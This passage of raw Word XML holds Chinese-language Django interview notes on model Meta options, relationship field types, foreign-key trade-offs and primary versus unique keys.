          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Oracle</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。你可以通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>db_tablespace</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>来</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0210BEB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指定这个模型对应的数据库表放在哪个数据库表空间。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5771752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db_tablespace</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A850F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由于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的管理方法中有个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>lastest()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法，就是得到最近一行记录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="723788A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如果你的数据模型中有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> DateField </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>或</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> DateTimeField </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>类型的字段，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5783000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你可以通过这个选项来指定</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>lastest()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是按照哪个字段进行选取的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A4182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get_latest_by = "order_date"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D40732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由于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>会自动根据模型类生成映射的数据库表，如果你不希望</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>这么做，可以把</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>managed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的值设置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C8F76B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为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>False</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。默认值为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>True,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>这个选项为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>True</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>时</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>可以对数据库表进行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> migrate</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>或</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>migrations</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66CA1D8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删除等操作。在这个时间</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>将管理数据库中表的生命周期如果为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>False</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的时候，不会对数据库表进行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72DA9B3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创建、删除等操作。可以用于现有表、数据库视图等，其他操作是一样的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4781F73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managed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF57EE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permissions</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>主要是为了在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django Admin</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>管理模块下使用的，如果你设置了这个属性可以让</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="681224C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指定的方法权限描述更清晰可读。要创建一个对象所需要的额外的权限</w:t>
      </w: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如果一个对象有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> admin </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>设置</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B1AD83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则每个对象的添加</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>删除和改变权限会人</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>依据该选项</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>自动创建</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE5869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下面这个例子指定了一个附加权限</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>: can_deliver_pizzas:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5369ACD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permissions = (("can_deliver_pizzas", "Can deliver pizzas"),)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1819A24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这个选项一般用于多对多的关系中，它指向一个关联对象。就是说关联对象找到这个对象后它是经过排序的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A7371A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指定这个属性后你会得到一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>get_XXX_order()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>set_XXX_order</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>（）的方法</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29DB26A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通过它们你可以设置或者回去排序的对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57667D2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rPr>
        <w:t xml:space="preserve">    order_with_respect_to = 'pizza'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11DB3821"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04.Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>模型类关系有哪几种</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2204F500" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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lastRenderedPageBreak/>
        <w:t>一对一关系：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>OneToOneField</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3337BE84" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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一对多关系：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ForeignKey</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C94ACA9" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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多对多关系：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ManyToManyField</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="6EB0C002"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4"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>05.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>外键有什么用，什么时候合适使用外接，外键一定需要索引吗？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC30D3B" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">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程序很难</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>100</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>％保证数据的完整性</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>而用外键即使在数据库服务器宕机或异常的时候</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>也能够最大限度的保证数据的一致性和完整性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EDF57B2" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">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如果项目性能要求不高</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>安全要求高</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>建议使用外键，如果项目性能要求高</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>安全自己控制，不用外键，因为外键查询比较慢。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2933F12D" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">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加入外键的主要问题就是影响性能</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>因此加入索引能加快关联查询的速度。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="48B816F3"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06.Primary Key</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Unique Key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>的区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59554CAE" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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Primary key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Unique Key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>都是唯一性约束。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="386B9856" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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Primary key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是主键，一个表只能由一个，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
